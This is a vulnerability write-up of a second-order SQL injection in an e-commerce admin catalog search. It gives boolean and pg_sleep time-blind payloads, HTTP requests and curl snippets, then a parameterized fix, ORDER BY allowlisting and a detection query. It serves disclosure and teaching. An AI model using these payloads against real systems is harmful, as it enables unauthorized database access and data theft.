# Hack Story — SQLi in Catalog Search (Admin Panel)

> **Summary:** Second‑order → Boolean/Time‑blind SQL injection in an **Admin catalog search** feature. Initial payload was stored in product metadata and later executed by an internal search builder. Non‑destructive proof via boolean flip and short time delay; fixed with prepared statements and identifier allowlists.

---

## 1) Context
- **App:** B2B e‑commerce platform
- **Area:** Admin → Catalog → Advanced Search
- **Role required:** Admin (internal ops)
- **DB Engine:** PostgreSQL 14
- **Driver:** node‑postgres (parameterized supported)

**Observation:** Admin search allowed filtering by arbitrary fields (name, sku, tags, attributes) and sort by any visible column. Inputs were persisted in a server‑side search template (JSON), later used to build dynamic SQL.

---

## 2) Architecture Snapshot
- **Client (Admin UI)** → POST `/admin/catalog/search` (JSON body)
- **API** builds a *search template* and stores it in `catalog_saved_filters` (JSONB).
- **Worker** later reads the template and constructs SQL in a helper: `WHERE ... LIKE '%<term>%'
  ORDER BY <client_column> <dir>`
- **DB**: `products` (id, sku, name, tags, ...), `catalog_saved_filters` (id, owner_id, jsonb)

> **Smell:** Use of string concatenation for both **predicate** and **identifier** (ORDER BY) construction.

---

## 3) Vulnerability
- **Type:** Second‑order SQL Injection → Boolean/Time‑blind
- **Sinks:**
  - `WHERE name ILIKE '%${term}%'` (predicate)
  - `ORDER BY ${client_column} ${dir}` (identifier + direction)
- **Root cause:** Stored JSON was read back and its fields were inserted into SQL text without binding or allowlists.

---

## 4) Reproduction (Minimal, Authorized)
> All payloads used a unique marker `q9xZ2025` and avoided data extraction beyond proof.

### 4.1 Seed payload (stored)
Send a **search template** that includes a benign‑looking term which becomes active later.
```http
POST /admin/catalog/search HTTP/1.1
Content-Type: application/json

{
  "name": "q9xZ2025' AND 1=1 -- -",
  "sort": "name",
  "dir": "asc",
  "save": true,
  "title": "ops-daily"
}
```
**Effect:** Stored under `catalog_saved_filters` as JSONB. No immediate error.

### 4.2 Trigger sink (admin opens saved search)
```http
GET /admin/catalog/search/use?title=ops-daily HTTP/1.1
```
**Expected behavior:** If injectable, result set widens/narrows depending on predicate.

### 4.3 Confirm boolean flip
Update the saved term to a **false** predicate and re‑trigger.
```http
POST /admin/catalog/search HTTP/1.1
Content-Type: application/json

{
  "name": "q9xZ2025' AND 1=2 -- -",
  "sort": "name",
  "dir": "asc",
  "save": true,
  "title": "ops-daily"
}
```
**Signal:** Response length shrinks consistently vs `1=1`.

### 4.4 Time‑based confirmation (3s blip)
```http
POST /admin/catalog/search HTTP/1.1
Content-Type: application/json

{
  "name": "q9xZ2025' AND CASE WHEN current_database()='appdb' THEN pg_sleep(3) ELSE pg_sleep(0) END -- -",
  "sort": "name",
  "dir": "asc",
  "save": true,
  "title": "ops-daily"
}
```
**Signal:** Median TTFB increases by ~3s on the saved search execution.

> **Note:** We kept delays to 2–3 seconds and ≤3 trials to minimize operational impact.

---

## 5) Evidence
- **HTTP diffs**
  - `1=1` vs `1=2` → body length: `~45kB` vs `~12kB` (median of 3).
  - Time probe → baseline ~180ms; TRUE branch median ~3.2s.
- **App logs**
  - Error once (during scoping): `syntax error at or near "AND"` pointing to concatenated query segment (line numbers redacted).
- **DB logs** (sample)
  - `statement: SELECT ... WHERE name ILIKE '%q9xZ2025' AND 1=1 -- -%' ORDER BY name ASC` (redacted with parameterization enabled later).

---

## 6) Impact
- **Data exposure potential:** Full catalog read via boolean/time extraction or UNION (if printable columns found).
- **Privilege level:** Admin search executes as application DB role with broad read rights across `products`.
- **Likelihood:** High under normal operations (admins routinely run saved searches).

**We did not** perform mass enumeration, UNION extraction, or OOB callbacks.

---

## 7) Fix (Implemented)
### 7.1 Parameterize predicates
```sql
-- Before (vulnerable)
... WHERE name ILIKE '%" + term + "%'

-- After (safe)
... WHERE name ILIKE CONCAT('%', $1, '%')
```
### 7.2 Allowlist identifiers for ORDER BY
```ts
const SORT_MAP: Record<string,string> = {
  name: 'name',
  sku: 'sku',
  created: 'created_at'
};
const sort = SORT_MAP[req.body.sort] ?? 'created_at';
const dir = req.body.dir === 'asc' ? 'ASC' : 'DESC';
const sql = `SELECT id, sku, name FROM products
            WHERE name ILIKE CONCAT('%', $1, '%')
            ORDER BY ${sort} ${dir} LIMIT $2 OFFSET $3`;
await db.query(sql, [term, limit, offset]);
```
### 7.3 Disable multi‑statement execution in the driver
- Confirmed `simple_query` path and no support for stacked statements in `node‑postgres` default config.

### 7.4 Tests & observability
- Added unit tests with seeds: `1=1`, `1=2`, short `pg_sleep(2)` canary (gated in CI to staging only).
- Redacted SQL sampling in logs; captured bind values separately.

---

## 8) Timeline (Example)
- **T0 (2025‑08‑07)**: Reported initial finding; PoC with `1=1/1=2` toggle.
- **T0+2d**: Time‑based confirmation (`pg_sleep(3)`), logs collected.
- **T0+6d**: Patch shipped to staging; QA sign‑off.
- **T0+9d**: Production rollout with monitoring; no regressions.

---

## 9) Lessons Learned
- **Second‑order paths** hide behind seemingly safe first‑order validation.
- Treat **stored templates** and **logs** as untrusted input—parameterize at **consumption** time.
- Always **map identifiers** for ORDER BY/JOIN. Parameters bind **values**, not identifiers.
- Maintain **DAST canaries** (boolean/time) for regression detection.

---

## 10) Appendix
### A) Minimal curl snippets
```bash
# Seed (TRUE)
curl -sS -H 'Content-Type: application/json'   -d '{"name":"q9xZ2025''' AND 1=1 -- -","sort":"name","dir":"asc","save":true,"title":"ops-daily"}'   https://admin.example.com/admin/catalog/search

# Seed (FALSE)
curl -sS -H 'Content-Type: application/json'   -d '{"name":"q9xZ2025''' AND 1=2 -- -","sort":"name","dir":"asc","save":true,"title":"ops-daily"}'   https://admin.example.com/admin/catalog/search

# Trigger
echo 'open saved search' && curl -sS https://admin.example.com/admin/catalog/search/use?title=ops-daily -D - -o /dev/null
```

### B) Detection hooks (Splunk/KQL skeletons)
```
index=web ("pg_sleep" OR "UNION SELECT" OR "syntax error at or near") | stats count by src, uri, user
```

### C) References
- `/sqli/types/second-order.md`
- `/sqli/types/boolean-blind.md`
- `/sqli/types/time-blind.md`
- `/sqli/mitigations/prepared-statements.md`
